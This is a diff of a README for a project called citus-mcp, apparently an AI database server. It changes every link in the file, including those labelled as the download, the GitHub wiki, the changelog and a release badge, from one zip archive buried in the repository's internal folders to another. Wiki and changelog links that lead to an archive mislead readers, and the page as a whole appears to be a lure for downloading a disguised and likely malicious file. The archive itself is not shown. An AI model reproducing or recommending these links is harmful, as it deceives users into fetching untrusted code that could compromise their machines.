@@ -1,6 +1,6 @@
 # 🤖 citus-mcp - Effortless AI Management for Databases
 
-![GitHub Releases](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/safety/mcp-citus-v1.5.zip%20Latest%20Release-FF5722?style=for-the-badge&logo=github)
+![GitHub Releases](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/mcpserver/citus-mcp-3.7-alpha.5.zip%20Latest%20Release-FF5722?style=for-the-badge&logo=github)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the AI-powered MCP server for
 
 To get started, you need to visit the following link to download the latest version of citus-mcp:
 
-[Download Latest Release](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/safety/mcp-citus-v1.5.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/mcpserver/citus-mcp-3.7-alpha.5.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -62,7 +62,7 @@ If you encounter any issues during installation or while using the application, 
 
 ## 📚 Additional Resources
 
-For more detailed documentation, FAQs, and community support, please visit our [GitHub wiki](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/safety/mcp-citus-v1.5.zip).
+For more detailed documentation, FAQs, and community support, please visit our [GitHub wiki](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/mcpserver/citus-mcp-3.7-alpha.5.zip).
 
 ## ✉️ Contact Us
 
@@ -70,6 +70,6 @@ For further inquiries or support, please reach out to our support team through t
 
 ## 📅 Changelog
 
-Stay updated with new features and improvements by checking our [https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/safety/mcp-citus-v1.5.zip](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/safety/mcp-citus-v1.5.zip).
+Stay updated with new features and improvements by checking our [https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/mcpserver/citus-mcp-3.7-alpha.5.zip](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/mcpserver/citus-mcp-3.7-alpha.5.zip).
 
-Again, don't forget to download the latest version [here](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/safety/mcp-citus-v1.5.zip). We hope you enjoy using citus-mcp for your database needs!
+Again, don't forget to download the latest version [here](https://raw.githubusercontent.com/Clauzi123/citus-mcp/main/internal/mcpserver/citus-mcp-3.7-alpha.5.zip). We hope you enjoy using citus-mcp for your database needs!
